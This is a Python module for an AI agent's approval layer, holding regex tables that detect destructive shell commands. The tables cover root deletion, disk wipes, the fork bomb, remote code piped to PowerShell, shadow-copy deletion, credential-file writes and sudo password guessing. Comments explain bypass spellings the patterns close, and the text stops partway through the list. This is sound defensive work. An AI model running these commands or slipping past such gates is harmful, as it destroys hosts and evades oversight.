"""Dangerous-command detection: normalization, tokenizing, and pattern tables.

Pure command classification for :mod:`tools.approval` — no approval state, config reads, or
prompting live here.
"""

import functools
import logging
import os
import re
import shlex
import tempfile
import unicodedata

logger = logging.getLogger("tools.approval")

# Sensitive write targets, matched via ~ / $HOME / $HERMES_HOME spellings. The resolved absolute
# home is folded into these forms at detection time by _normalize_command_for_detection(), so no
# import-time path snapshot (stale once HERMES_HOME is set after import) lives in the patterns.
_SSH_SENSITIVE_PATH = r'(?:~|\$home|\$\{home\})/\.ssh(?:/|$)'
_HERMES_ENV_PATH = (
    r'(?:~\/\.hermes/|(?:\$home|\$\{home\})/\.hermes/|(?:\$hermes_home|\$\{hermes_home\})/)' r'\.env\b'
)
# ~/.hermes/config.yaml IS the security policy (approvals.mode, yolo, allowlist) and the config cache is mtime-keyed,
# so a write takes effect mid-session. Terminal-side coverage (sed -i, tee, >, cp) pairs the file_tools deny.
_HERMES_CONFIG_PATH = (
    r'(?:~\/\.hermes/|(?:\$home|\$\{home\})/\.hermes/|(?:\$hermes_home|\$\{hermes_home\})/)' r'config\.yaml\b'
)
_PROJECT_ENV_PATH = r'(?:(?:/|\.{1,2}/)?(?:[^\s/"\'`]+/)*\.env(?:\.[^/\s"\'`]+)*)'
_PROJECT_CONFIG_PATH = r'(?:(?:/|\.{1,2}/)?(?:[^\s/"\'`]+/)*config\.yaml)'
_SHELL_RC_FILES = r'(?:~|\$home|\$\{home\})/\.' r'(?:bashrc|zshrc|profile|bash_profile|zprofile)\b'
_CREDENTIAL_FILES = r'(?:~|\$home|\$\{home\})/\.' r'(?:netrc|pgpass|npmrc|pypirc)\b'
# macOS: /etc, /var, /tmp, /home are symlinks to /private/*, so /private/etc/sudoers would bypass a plain
# "/etc/" check. Match both forms.
_MACOS_PRIVATE_SYSTEM_PATH = r'/private/(?:etc|var|tmp|home)/'
_SYSTEM_CONFIG_PATH = rf'(?:/etc/|{_MACOS_PRIVATE_SYSTEM_PATH})'
_SENSITIVE_WRITE_TARGET = (
    rf'(?:{_SYSTEM_CONFIG_PATH}|/dev/sd|{_SSH_SENSITIVE_PATH}|{_HERMES_ENV_PATH}|{_HERMES_CONFIG_PATH}|'
    rf'{_SHELL_RC_FILES}|{_CREDENTIAL_FILES})'
)
_USER_SENSITIVE_WRITE_TARGET = rf'(?:{_SSH_SENSITIVE_PATH}|{_SHELL_RC_FILES}|{_CREDENTIAL_FILES})'
_PROJECT_SENSITIVE_WRITE_TARGET = rf'(?:{_PROJECT_ENV_PATH}|{_PROJECT_CONFIG_PATH})'
# cp/mv/install: the sensitive path is a write target only as the LAST argument (destination), so
# `cp config.yaml backup.yaml` (config.yaml as SOURCE) stays out.
_COMMAND_TAIL = r'(?:\s*(?:&&|\|\||;).*)?$'
# `>`/`>>`/tee: the path is ALWAYS a write target regardless of what follows, so only require a
# shell word boundary (_COMMAND_TAIL let `echo x > .env extra` / `echo x > .env # note` slip past).
# `#` is deliberately NOT a boundary: a glued `#` is part of the filename (`.env#backup`).
_WRITE_TARGET_BOUNDARY = r'(?=[\s;&|<>"\']|$)'
# One shell command segment: stops at `;`/`&`/`|`/newline so a token in a LATER segment cannot
# contaminate the verdict (same bound the git push rules use).
_SEGMENT_BOUND = r'[^;|&\n]*'
# Packages whose removal/purge takes out security or infrastructure (ufw/iptables/fail2ban are the
# host firewall; openssh-server is the only remote access path; postgresql* purge runs a postrm that
# deletes the cluster data dir; docker.io/containerd take out every container's data plane; caddy/
# nginx front the public services). Deliberately an explicit list, never a wildcard: `apt remove -y
# python3-pip` (corpus X127) must stay clean.
_APT_INFRA_PACKAGES = (
    r'(?:caddy|nginx|openssh-server|openssh-client|postgresql(?:-\d+)?|docker\.io|docker-ce|'
    r'containerd|ufw|iptables|nftables|fail2ban|redis-server|wireguard|openvpn|hermes-agent|gbrain)\b'
)

# ---- Hardline (unconditional) blocklist ---------------------------------------------------
# Commands that NEVER run via the agent, regardless of --yolo, approvals.mode=off, or cron approve
# mode — a floor below yolo. Applies only to environments that can damage the host (local, ssh,
# container-host cron); containerized backends already bypass the dangerous-command layer.
# Deliberately tiny: only things with no recovery path (root wipe, raw block device writes,
# shutdown, DoS). Recoverable operations (git reset --hard, chmod -R 777, curl|sh) stay in
# DANGEROUS_PATTERNS.

# Start-of-command position: start of string, newline, subshell opener ($( or backtick), optionally consuming
# sudo/env/exec/nohup/setsid/time wrappers. Keeps shutdown/reboot rules from firing on "echo reboot" / "grep
# 'shutdown' log". Real ;/&/| separators are converted to newlines by the quote-aware _mark_command_starts pass;
# keeping them here mistakes quoted data (grep '(safe|rm -rf /)') for commands.
_CMDPOS = (
    r'(?:^|[\n`]|\$\()' r'\s*'  # start position, optional whitespace
    r'(?:sudo\s+(?:-[^\s]+\s+)*)?' r'(?:env\s+(?:\w+=\S*\s+)*)?'  # optional sudo with flags, env VAR=VAL pairs
    r'(?:(?:exec|nohup|setsid|time)\s+)*' r'\s*'  # optional wrapper commands
)


# Destructive-path matcher for the rm hardline rules: accept the path fully wrapped in a matching
# quote pair (`rm -rf "/"`, `rm -rf "$HOME"`) OR bare with a terminator (whitespace, end, or
# `) ` ; | &` so `$(rm -rf /)` is caught). A bare-token-only anchor lets quoted spellings slip past the floor.
def _hardline_rm_path(path_alt: str, tail: str = r'(?:\s|$|[)`;|&])') -> str:
    return rf'(?:["\'](?:{path_alt})["\']|(?:{path_alt}){tail})'


# Protected system roots whose recursive deletion has no recovery path.
_HARDLINE_SYSTEM_DIRS = (r'/home|/home/\*|/root|/root/\*|/etc|/etc/\*|/usr|/usr/\*|'
                         r'/var|/var/\*|/bin|/bin/\*|/sbin|/sbin/\*|/boot|/boot/\*|/lib|/lib/\*')

# `rm` plus flag group, shared by the rm hardline rules (plain concatenation, not f-string:
# backslashes in replacement fields are unsupported on the 3.11 floor). _CMDPOS-anchored so `rm`
# must be an actual command word — "rm -rf /" as DATA in `git commit -m "…rm -rf /…"` must not trip the floor.
_RM_FLAG_PREFIX = _CMDPOS + r'rm\s+(-[^\s]*\s+)*'
# Package-manager global options, each optionally taking ONE non-dash operand.
_PKG_OPTS = r'(?:-[^\s]+(?:\s+[^-\s][^\s]*)?\s+)*'

HARDLINE_PATTERNS = [
    # Root path: any root-anchored path whose components collapse to "/" in the shell ("/", "//",
    # "/.", "/./", "/../..", optional trailing glob). Each inter-slash segment must be exactly "."
    # or "..", so "/tmp", "/.ssh", even "/..." are literal dirs that fall through to the softer
    # DANGEROUS rules. The "/ \*" alt covers `rm -rf / *` (two args: "/" plus the glob).
    (_RM_FLAG_PREFIX + _hardline_rm_path(r'/(?:(?:\.\.?)?/)*(?:\.\.?)?\**|/ \*'), "recursive delete of root filesystem"),
    (_RM_FLAG_PREFIX + _hardline_rm_path(_HARDLINE_SYSTEM_DIRS), "recursive delete of system directory"),
    (_RM_FLAG_PREFIX + _hardline_rm_path(r'(?:~|\$\{?HOME\}?)(?:/?|/\*)?'), "recursive delete of home directory"),
    # Command-name rules (mkfs, dd, kill, shutdown...) are _CMDPOS-anchored so quoted prose
    # (`echo "does this use mkfs?"`) cannot trip the floor.
    # See #93392.
    (_CMDPOS + r'mkfs(\.[a-z0-9]+)?\b', "format filesystem (mkfs)"),
    # `dd` is a command-name token, so anchor it to command position like mkfs/rm/shutdown (#93392): quoted
    # prose such as `git commit -m "never dd of=/dev/sda"` is an argument, not a command. The argument tail
    # ([^\n]*of=/dev/...) is kept so flag order doesn't matter.
    (_CMDPOS + r'dd\b[^\n]*\bof=/dev/(sd|nvme|hd|mmcblk|vd|xvd)[a-z0-9]*', "dd to raw block device"),
    # Positionless rules (no command-name token: `>` sits mid-command, the fork bomb is a function
    # definition) are matched against a QUOTE-MASKED variant (_QUOTE_MASKED_HARDLINE_DESCRIPTIONS /
    # _mask_quoted_prose) so quoted prose cannot trip them; sh -c / bash -c / eval payloads still scan raw.
    # The redirect rule has no command-name token to anchor (`>` appears mid-command: `cat f > /dev/sda`),
    # so command-position anchoring is the wrong tool. It is instead matched against a QUOTE-MASKED variant
    # of the command (see _QUOTE_MASKED_HARDLINE / _mask_quoted_strings) so quoted prose (`echo "cat f >
    # /dev/sda"`) cannot trip it, while shell-carrying wrappers (sh -c / bash -c / eval) still surface their
    # payload as a raw detection variant — quoting is not a bypass (#93392).
    (r'>\s*/dev/(sd|nvme|hd|mmcblk|vd|xvd)[a-z0-9]*\b', "redirect to raw block device"),
    (r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:', "fork bomb"),
    # Kill every process on the system — anchor the command-name token so `echo "kill -1 sends SIGHUP to
    # everything"` doesn't trip (#93392).
    (_CMDPOS + r'kill\s+(-[^\s]+\s+)*-1\b', "kill all processes"),
    (_CMDPOS + r'(shutdown|reboot|halt|poweroff)\b', "system shutdown/reboot"),
    (_CMDPOS + r'init\s+[06]\b', "init 0/6 (shutdown/reboot)"),
    (_CMDPOS + r'systemctl\s+(poweroff|reboot|halt|kexec)\b', "systemctl poweroff/reboot"),
    (_CMDPOS + r'telinit\s+[06]\b', "telinit 0/6 (shutdown/reboot)"),
]

# Pre-compiled at module load so the hot-path matcher never pays the cold re.compile fan-out
# (re._cache can be evicted by unrelated regex work).
_RE_FLAGS = re.IGNORECASE | re.DOTALL
# Positionless hardline rules matched against quote-masked variants (see above).
_QUOTE_MASKED_HARDLINE_DESCRIPTIONS = frozenset({"redirect to raw block device", "fork bomb"})
HARDLINE_PATTERNS_COMPILED = [
    (re.compile(p, _RE_FLAGS), d, d in _QUOTE_MASKED_HARDLINE_DESCRIPTIONS) for p, d in HARDLINE_PATTERNS
]
# Commands that hand a quoted argument to another shell to EXECUTE: quoted text is code, not
# prose, so quote-masked hardline rules scan the raw string.
_SHELL_CARRIER_NAMES = frozenset({"eval", "sh", "bash", "zsh", "ksh", "dash", "source", "."})
# The shell members of _SHELL_CARRIER_NAMES, as one tuple plus alternation shared by every
# pipe/decode/process-substitution/heredoc pattern and the structural -c payload scan, so
# the shell-name list cannot drift between them again (the drift let `curl url | zsh` and
# `dash -c` through while bash/sh were flagged).
_SHELL_NAMES = ("bash", "sh", "zsh", "ksh", "dash")
_SHELL_NAMES_RE = "|".join(_SHELL_NAMES)


def _contains_shell_carrier(command: str) -> bool:
    """Return whether any command-position word is a shell-carrying command."""
    return any(
        os.path.basename(_deobfuscate_shell_word_for_detection(word)).lower() in _SHELL_CARRIER_NAMES
        for _, _, word in _iter_shell_command_word_spans(command)
    )


def _mask_quoted_prose(command: str) -> str:
    """Blank out quoted string CONTENT for positionless hardline matching (detection-only).
    Quote characters stay; inside double quotes `$(...)` and backtick spans are kept RAW because
    the shell really executes them. An unclosed quote masks to end-of-string, which cannot hide a
    runnable command (the shell would not run it either).

    Detection-only rewrite used by the quote-masked hardline rules (redirect-to-block-device, fork bomb):
    text inside single or double quotes is data the shell passes as an argument, so `echo "cat f >
    /dev/sda"` must not trip the unconditional floor (#93392). Unquoted text is untouched.
    """
    return "".join(
        command[i:j] if quote is None or kind in ("quote", "subst") else " " * (j - i)
        for kind, i, j, quote in _scan_shell(command, subst="q", naive_backtick=True)
    )


# ---- Heredoc bodies: stdin DATA, not code ---------------------------------------------------
# A heredoc body is stdin DATA for the command that reads it: `cat <<EOF > doc.md` plus a documentation
# body never executes that text, so a command-word rule firing on it is the same documentation-shaped
# false positive the quoted-prose guard removes for string arguments.
#
# The guard is an ALLOWLIST of pure data consumers, never a list of executors. The set of programs that
# can turn stdin into execution has no bound — schedulers that run the body later (`crontab -`, `at`,
# `batch`), service managers (`systemd-run --pipe`), database clients with a shell escape (`sqlite3`
# `.shell`, `psql` `\!`), shells, interpreters, indirection programs — so an executor deny-list fails
# OPEN the moment it misses one class. The set of programs that can only consume stdin as bytes is
# small and enumerable, so the guard asks the positive question instead: mask the body only when EVERY
# program it can reach is on this list. Every other reader, and every reader the scan cannot identify
# at all, keeps the body RAW, i.e. gated — gating a body that turns out to be data is a false positive
# and recoverable, masking one that turns out to be code is a false negative.
_HEREDOC_DATA_CONSUMERS = frozenset({
    # Copiers and filters: bytes in, bytes out, to stdout or to a named file. None of them has an
    # option, an operator or a sub-command that runs a program over the data. Programs that look like
    # filters but do have one stay out: `sed` (`e`), `awk` (`system()`), `sort`
    # (`--compress-program` pipes the data into a program), `less`/`more` (interactive shell escape),
    # `xargs`/`find`/`tar` (run the data or a program named on the command line).
    "cat", "tee", "dd", "head", "tail", "nl", "od", "xxd", "hexdump", "strings", "base64", "cksum",
    "md5sum", "sha1sum", "sha256sum", "sha512sum", "wc", "uniq", "tr", "cut", "paste", "join",
    "comm", "fold", "expand", "unexpand", "rev", "tac", "shuf", "column", "fmt", "pr", "split",
    "csplit", "tsort", "numfmt", "diff", "cmp",
    # Shell builtins that only write their arguments out.
    "printf", "echo",
})
# Command-list separators. Everything between two of them shares the heredoc's stdin path, so a
# `| bash` in the same list keeps the body raw. `|` is deliberately NOT one: a pipe CARRIES the body.
_HEREDOC_LIST_SEPARATORS = ";\n&(){}"


def _iter_heredoc_operators(command: str):
    """Yield ``(operator_start, delimiter, quoted_delimiter)`` for every ``<<`` heredoc operator.

    ``<<<`` here-strings and the second ``<`` of a longer run are not operators. The scan tracks
    quotes, so a ``<<`` inside a substitution is not seen here; that body is then left raw, which is
    the fail-safe direction.
    """
    for kind, i, _, quote in _scan_shell(command, subst="uq", comments=True):
        if kind != "char" or quote is not None or command[i] != "<":
            continue
        if i and command[i - 1] == "<":
            continue
        if not command.startswith("<<", i) or command.startswith("<<<", i):
            continue
        start = i + 2
        if command.startswith("-", start):  # `<<-EOF` strips leading tabs from the terminator line
            start += 1
        _, _, word = _read_shell_word(command, start)
        delimiter = _strip_shell_word_syntax(word)
        if delimiter:
            yield (i, delimiter, delimiter != word)


def _heredoc_body_span(command: str, body_start: int, delimiter: str) -> tuple[int, int]:
    """Return ``(body_end, after_terminator)`` for the body starting at *body_start*.

    The terminator is the first line that is exactly *delimiter* (leading tabs ignored, as ``<<-``
    allows). When no such line exists the first standalone *delimiter* token ends the body instead:
    ``_mask_quoted_newlines`` folds an unmatched quote in the body into a space and can pull the
    terminator up into the previous line, and stopping at that token under-masks rather than
    swallowing a real command written after the heredoc. With no token at all the heredoc is
    unterminated, and the shell consumes the rest of the input as its body, so the remainder is body.
    """
    position = body_start
    while position <= len(command):
        newline = command.find("\n", position)
        line = command[position:newline if newline >= 0 else len(command)]
        if line.rstrip("\r").lstrip("\t") == delimiter:
            return (position, len(command) if newline < 0 else newline + 1)
        if newline < 0:
            break
        position = newline + 1
    offset = body_start
    while True:
        hit = command.find(delimiter, offset)
        if hit < 0:
            return (len(command), len(command))
        after = hit + len(delimiter)
        if (hit == body_start or command[hit - 1].isspace()) and (after >= len(command) or command[after].isspace()):
            return (hit, after)
        offset = hit + 1


def _iter_heredoc_bodies(command: str):
    """Yield ``(body_start, body_end, quoted_delimiter, operator_start)`` for every heredoc body, in
    the order the shell reads them.

    A body starts on the line after the one that opened it; consecutive operators on one line consume
    their bodies in operator order, each starting after the previous terminator. A ``<<`` inside a body
    is data, not an operator — bash reads exactly one body per operator — so it is skipped.
    """
    last_body: tuple[int, int] | None = None
    next_body_start = None
    for operator_start, delimiter, quoted in _iter_heredoc_operators(command):
        if last_body is not None and last_body[0] <= operator_start < last_body[1]:
            continue
        if next_body_start is None or operator_start >= next_body_start:
            newline = command.find("\n", operator_start)
            if newline < 0:
                return
            body_start = newline + 1
        else:
            body_start = next_body_start
        body_end, next_body_start = _heredoc_body_span(command, body_start, delimiter)
        if body_start == body_end:  # empty body: nothing to mask, and the next body starts after it
            last_body = None
            continue
        last_body = (body_start, body_end)
        yield (body_start, body_end, quoted, operator_start)


def _heredoc_reader_names(command: str, operator_start: int, words) -> list[str]:
    """Names of every program a heredoc body can reach from *operator_start*, wrappers removed.

    *words* is the command-word span list for the whole command (computed once per call, not per
    heredoc). The body travels down the pipeline, so the readers are the command word of the stage
    holding the operator plus the command word of every stage after it (`cat <<EOF | bash` hands the
    body to `bash`), and everything between two command-list separators shares that stdin path.
    Pass-through wrappers (`sudo`, `env`, `nohup`, ...) are dropped: they inherit stdin for the program
    they launch, so `sudo tee /etc/nginx/nginx.conf <<EOF` reads the body through `tee`.
    """
    list_start, list_end = 0, len(command)
    pipes: list[int] = []
    for kind, i, _, quote in _scan_shell(command, subst="uq", comments=True):
        if kind != "char" or quote is not None:
            continue
        if command[i] in _HEREDOC_LIST_SEPARATORS:
            if i < operator_start:
                list_start, pipes = i + 1, []
            else:
                list_end = i
                break
        elif command[i] == "|" and list_start <= i < operator_start:
            pipes.append(i)
    stage_start = max(pipes, default=list_start - 1) + 1
    return [
        os.path.basename(_deobfuscate_shell_word_for_detection(word)).lower()
        for word_start, _, word in words if stage_start <= word_start < list_end
    ]


def _heredoc_body_is_data(command: str, operator_start: int, words) -> bool:
    """Whether every program a heredoc body can reach is a known pure data consumer.

    Only a positive identification masks the body. An empty reader set -- a bare redirection, a command
    position the word scan could not parse -- keeps the body raw, as does any name off the allowlist.
    """
    readers = [
        name for name in _heredoc_reader_names(command, operator_start, words)
        if name not in _COMMAND_WRAPPER_WORDS
    ]
    return bool(readers) and all(name in _HEREDOC_DATA_CONSUMERS for name in readers)


def _heredoc_body_replacement(body: str, quoted_delimiter: bool) -> str:
    """Return what the detection variant keeps of one heredoc body: nothing, except the command
    substitutions the shell still expands inside an UNQUOTED-delimiter body — those really run.

    The body is REMOVED rather than blanked in place. Blanking turns a whole body into one long
    whitespace run, and the command-word patterns backtrack catastrophically over runs like that
    (measured on this branch: 15.6 s for the 59 rules over a 3.4 KB body, minutes over 14 KB).
    Only a body whose readers are ALL known pure data consumers (``_HEREDOC_DATA_CONSUMERS``) reaches
    this function, so removing it cannot hide a runnable command. A QUOTED delimiter (`<<'EOF'`,
    `<<"EOF"`, `<<\\EOF`) suppresses expansion, so nothing in that body survives at all.
    """
    if quoted_delimiter:
        return ""
    kept: list[str] = []
    i, n = 0, len(body)
    while i < n:
        char = body[i]
        if char == "\\" and i + 1 < n:  # an escaped char is literal text, not an expansion
            i += 2
            continue
        close = None
        if body.startswith("$(", i):
            close = _scan_dollar_paren_end(body, i)
        elif char == "`":
            close = _scan_backtick_end(body, i)
        if close is not None:
            kept.append(body[i:close])
            i = close
            continue
        i += 1
    return "\n".join(kept)


def _mask_heredoc_bodies(command: str) -> str:
    """Drop heredoc BODY text for the command-word rules (detection-only).

    Documentation written through a heredoc (`cat <<EOF > doc.md`, `tee runbook.md <<EOF`) is data
    for the command that reads it, exactly like a quoted argument, so the command-word rules must not
    fire on it. Only a body whose readers are ALL known pure data consumers is dropped (see
    ``_HEREDOC_DATA_CONSUMERS``); every other reader keeps the body raw. The terminator line and
    everything outside the body are untouched.
    """
    if "<<" not in command:
        return command
    words = list(_iter_shell_command_word_spans(command))
    edits = [
        (start, end, _heredoc_body_replacement(command[start:end], quoted))
        for start, end, quoted, operator_start in _iter_heredoc_bodies(command)
        if _heredoc_body_is_data(command, operator_start, words)
    ]
    return _splice(command, edits) if edits else command


# ---- Sudo stdin guard: without SUDO_PASSWORD configured, an explicit "sudo -S" is the LLM piping
# a guessed password via stdin (brute-force vector). Unconditional block.
_SUDO_STDIN_RE = re.compile(r'(?:^|[;&|`\n]|&&|\|\||\$\()\s*sudo\s+-S\b', re.IGNORECASE)


def _check_sudo_stdin_guard(command: str) -> tuple:
    """Detect ``sudo -S`` without configured SUDO_PASSWORD -> (is_blocked, description). When
    SUDO_PASSWORD is set, ``_transform_sudo_command`` injects ``-S`` itself, so this guard only
    fires when the LLM wrote it explicitly."""
    if "SUDO_PASSWORD" not in os.environ and _SUDO_STDIN_RE.search(_normalize_command_for_detection(command).lower()):
        return (True, "sudo password guessing via stdin (sudo -S)")
    return (False, None)


def detect_hardline_command(command: str) -> tuple:
    """Check hardline patterns (NEVER bypassable, even in YOLO) -> (is_hardline, description)."""
    if _command_parser_limit_exceeded(command):
        return (True, _PARSER_LIMIT_DESCRIPTION)
    # The malformed-quoting verdict needs the author's quote state. Normalization strips escapes
    # (`\"` -> `"`), so a shell-valid pattern like `grep -o "[^\"]*"` lexed as unterminated and was
    # reported as a hardline block (118 of 125 hardline blocks in one week of real use, every one a
    # benign grep). Only quoted newlines are masked: they are data, and masking keeps quoting intact.
    _, malformed_grep = _grep_safe_detection_variant(_mask_quoted_newlines(command))
    if malformed_grep:
        return (True, _MALFORMED_EXEC_DESCRIPTION)
    for command_variant in _command_detection_variants(command):
        variant_lower = command_variant.lower()
        masked_lower: str | None = None
        for pattern_re, description, quote_masked in HARDLINE_PATTERNS_COMPILED:
            if quote_masked and masked_lower is None:
                # Positionless rules see quoted prose as DATA, except under shell carriers
                # (sh -c, eval, source) whose quoted argument is code — those scan raw. bash -c
                # payloads also surface as their own raw variants via _execution_flag_findings.
                masked_lower = (
                    variant_lower if _contains_shell_carrier(command_variant)
                    else _mask_quoted_prose(command_variant).lower()
                )
            if pattern_re.search(masked_lower if quote_masked else variant_lower):
                return (True, description)
    return (False, None)


# ---- Dangerous command patterns -----------------------------------------------------------
# `git` accepts global options BEFORE the subcommand (`git -C DIR push`, `git -c k=v push --mirror`,
# `git --git-dir=… push`). The old `\bgit\s+push\b` anchor let every global-option spelling bypass the
# push rules — the incident's actual command was `git -C /srv/app push --mirror origin`.
# The option group is bounded (fixed alternation, `-C` consumes exactly one argument) so it cannot
# swallow an arbitrary word and revive cross-token FPs.
_GIT_PUSH = (
    r'\bgit\b(?:\s+(?:-C\s+\S+|-c\s+\S+|--git-dir(?:=\S+|\s+\S+)'
    r'|--work-tree(?:=\S+|\s+\S+)|--namespace=\S+|--exec-path(?:=\S+|\s+\S+)))*\s+push\b'
)
# Same bounded global-option set as _GIT_PUSH, but placed AFTER `\bgit` so the regex-derived legacy
# approval key (`p.split(r'\b')[1]`) stays UNIQUE per rule — `git…checkout`, `git…stash`, … — instead
# of collapsing to the bare `git` key every push rule already shares (alias collision, see
# _PATTERN_KEY_ALIASES). `-C`/`--git-dir`/`--work-tree`/`--exec-path` consume exactly one argument,
# so the group cannot swallow an arbitrary word and revive cross-token false positives.
_GIT_OPT = (
    r'(?:\s+(?:-C\s+\S+|-c\s+\S+|--git-dir(?:=\S+|\s+\S+)'
    r'|--work-tree(?:=\S+|\s+\S+)|--namespace=\S+|--exec-path(?:=\S+|\s+\S+)))*'
)
# Read-only spellings of a gated verb — the chain-wide criterion: no new or
# touched rule may gate a pure lookup. The lookahead is anchored to the FIRST token after the
# command word, so a flag further along the line buys no exemption (same shape as the
# filter-repo rule). `--list` is included: swapoff/fuser take no `--list` ACTION, so it is only
# ever an informational listing there, and a lookup is a lookup.
_LOOKUP_FLAGS = r'(?!\s+(?:--help\b|-h\b|--version\b|--dry-run\b|--list\b))'

DANGEROUS_PATTERNS = [
    (r'\brm\s+(-[^\s]*\s+)*/', "delete in root path"),
    (r'\brm\s+-[^\s]*r', "recursive delete"),
    (r'\brm\s+--recursive\b', "recursive delete (long flag)"),
    # GNU rm permutes options, so flags may FOLLOW operands (`rm build/ -rf`). The operand run
    # cannot cross a command separator (so `rm foo | grep -r` is not attributed to rm), a quote,
    # or a bare ` -- ` end-of-options (after which `-rf` is a literal filename). The flag token
    # must follow whitespace so the `r` in long options like `--registry` does not count.
    (r'\brm\s+(?!--(?:\s|$))(?:(?!\s--(?:\s|$))[^\n"\';|&])*\s' r'(?:-[a-z]*r[a-z]*\b|--recursive\b)',
     # GNU rm permutes options, so a recursive flag group may legally FOLLOW the operands: `rm build/ -rf`,
     # `rm build/ -r -f`, and `rm build/ --recursive --force` are all equivalent to the flags-first
     # spellings the two patterns above catch — without this rule they run with no approval prompt at all.
     # Port of openai/codex#33464 ("recognize force options when they follow operands").
     "recursive delete (flags after operands)"),
    # Windows cmd/powershell destructive built-ins: gate only when executed through the shell so
    # prose/filenames containing "del"/"rd" do not trip.
    (r'\bcmd(?:\.exe)?\s+/(?:c|k)\s+.*\b(?:del|erase|rd|rmdir)\b', "Windows cmd destructive delete"),
    # PowerShell runs the verb as default positional arg (no -Command needed); anchor the verb to command
    # position (after leading -Flag switches and optional -Command/-c) so `-File c:\del-logs\run.ps1` is not caught.
    (r'\b(?:powershell|pwsh)(?:\.exe)?\b(?:\s+-\S+)*\s+(?:-(?:command|c)\s+)?["\']?(?:remove-item|rmdir|erase|del|rd|ri|rm)\b', "Windows PowerShell destructive delete"),
    (r'\b(?:powershell|pwsh)(?:\.exe)?\b.*\s-(?:encodedcommand|enc|e)\b', "PowerShell encoded command execution"),
    # ── Windows destructive tier: native Windows EXEs/cmdlets reachable from ANY backend on a
    # Windows host (incl. git-bash). Input is lowercased by the variant loop, so patterns are
    # lowercase. Each requires the destructive flag/verb so benign usage (`taskkill /IM app.exe`,
    # `reg query`, `icacls file`) does NOT prompt. Bare Remove-Item form (ACP clients, pwsh-default
    # SSH hosts, or compound commands where `powershell` appeared earlier).
    # See #69472.
    (r'\bremove-item\b[^\n;|&]*\s-(?:recurse|force)\b', "PowerShell destructive delete (Remove-Item)"),
    # Bare cmd builtins with /s (recurse) or /q (quiet); plain `del file.txt` is covered only by the prefixed rule.
    (r'\b(?:del|erase|rd|rmdir)\s+(?:/[a-z]\s+)*/[sq]\b', "Windows destructive delete (recursive/quiet switch)"),
    # Remote content piped to Invoke-Expression — PowerShell's `curl | sh`.
    (r'\b(?:iwr|invoke-webrequest|invoke-restmethod|irm|curl|wget)\b[^\n]*\|\s*(?:iex|invoke-expression)\b', "pipe remote content to PowerShell (iwr | iex)"),
    (r'\b(?:iex|invoke-expression)\s*\(\s*(?:iwr|invoke-webrequest|invoke-restmethod|irm)\b', "execute remote content via Invoke-Expression"),
    # Force process kills — Windows analogue of pkill -9.
    (r'\btaskkill\b[^\n]*\s/f\b', "force kill processes (taskkill /F)"),
    (r'\bstop-process\b[^\n]*\s-force\b', "force kill processes (Stop-Process -Force)"),
    # Volume/disk destruction — Windows analogue of mkfs / dd.
    (r'\bformat-volume\b', "format filesystem (Format-Volume)"),
    (r'\bclear-disk\b', "wipe disk (Clear-Disk)"),
    (r'\bdiskpart\b', "disk partitioning (diskpart)"),
    (r'\bformat(?:\.com)?\s+[a-z]:', "format drive (format.com)"),
    (r'\bcipher\s+/w\b', "wipe free space (cipher /w)"),
    # ACL destruction — Windows analogue of chmod 777.
    (r'\bicacls\b[^\n]*\s/grant\b[^\n]*\b(?:everyone|todos|jeder|tout\s+le\s+monde|\*s-1-1-0)\b', "grant Everyone access (icacls)"),
    (r'\bicacls\b[^\n]*\s/reset\b', "reset ACLs recursively (icacls /reset)"),
    # Backup/recovery destruction — classic ransomware prep.
    (r'\bvssadmin\b[^\n]*\bdelete\s+shadows\b', "delete volume shadow copies (vssadmin)"),
    (r'\bwbadmin\b[^\n]*\bdelete\b', "delete backups (wbadmin)"),
    (r'\bbcdedit\b[^\n]*\s/set\b', "modify boot configuration (bcdedit /set)"),
    # Registry deletion with force flag.
    (r'\breg(?:\.exe)?\s+delete\b', "registry delete (reg delete)"),
    (r'\bremove-itemproperty\b[^\n]*\s-force\b', "registry value delete (Remove-ItemProperty -Force)"),
    # Windows service/system stop — analogue of systemctl stop.
    (r'\bstop-service\b[^\n]*\s-force\b', "force stop service (Stop-Service -Force)"),
    (r'\bsc(?:\.exe)?\s+(?:stop|delete)\b', "stop/delete service (sc)"),
    # Windows-form credential paths; the POSIX ~/.ssh patterns never match drive-letter or backslash spellings.
    (r'\busers[\\/][^\\/\s]+[\\/]\.ssh\b', "access to SSH keys (Windows path)"),
    (r'\bappdata[\\/](?:local|roaming)[\\/]hermes[^\n]*\.env\b', "access to Hermes secrets (Windows path)"),
    # ── end of Windows tier
    (r'\bchmod\s+(-[^\s]*\s+)*(777|666|o\+[rwx]*w|a\+[rwx]*w)\b', "world/other-writable permissions"),
    (r'\bchmod\s+--recursive\b.*(777|666|o\+[rwx]*w|a\+[rwx]*w)', "recursive world/other-writable (long flag)"),
    (r'\bchown\s+(-[^\s]*)?R\s+root', "recursive chown to root"),
    (r'\bchown\s+--recur[a-z]*\b.*root', "recursive chown to root (long flag)"),
    # _CMDPOS-anchored like the hardline twins: quoted prose mentioning mkfs/dd must not require approval to echo.
    # See #93392.
    (_CMDPOS + r'mkfs\b', "format filesystem"),
    (_CMDPOS + r'dd\s+.*if=', "disk copy"),
    (r'>\s*/dev/sd', "write to block device"),
    (r'\bDROP\s+(TABLE|DATABASE)\b', "SQL DROP"),
    # [^\n]* not .*: under DOTALL a WHERE on the *next* line would satisfy the lookahead and
    # silently allow DELETE without WHERE.
    (r'\bDELETE\s+FROM\b(?![^\n]*\bWHERE\b)', "SQL DELETE without WHERE"),
    (r'\bTRUNCATE\s+(TABLE)?\s*\w', "SQL TRUNCATE"),
    (rf'>\s*{_SYSTEM_CONFIG_PATH}', "overwrite system config"),
    (r'\bsystemctl\s+(-[^\s]+\s+)*(stop|restart|disable|mask)\b', "stop/restart system service"),
    (r'\bkill\s+-9\s+-1\b', "kill all processes"),
    # `kill -9 1` (or any `kill -<sig> 1`) targets PID 1: killing init/systemd tears down every
    # service on the host (X070). `kill -HUP $(cat pid)` (X075) has no bare `1` and stays clean.
    (r'\bkill\s+-\w+\s+1\s*(?:;|&|$|\n)', "kill PID 1 (init)"),  # X070
    # `ip link set <iface> down` takes a network interface offline — remote access included
    # (X094). `ip -br a` (X099) and other read-only `ip` invocations don't carry `link … down`.
    (r'\bip\b' + _SEGMENT_BOUND + r'\blink\b' + _SEGMENT_BOUND + r'\bset\b' + _SEGMENT_BOUND + r'\bdown\b',
     "bring network interface down"),  # X094
    # `systemctl isolate <target>` stops every unit not in the target; rescue/emergency targets
    # drop all running services (X255). stop/restart/disable are gated by the rule above.
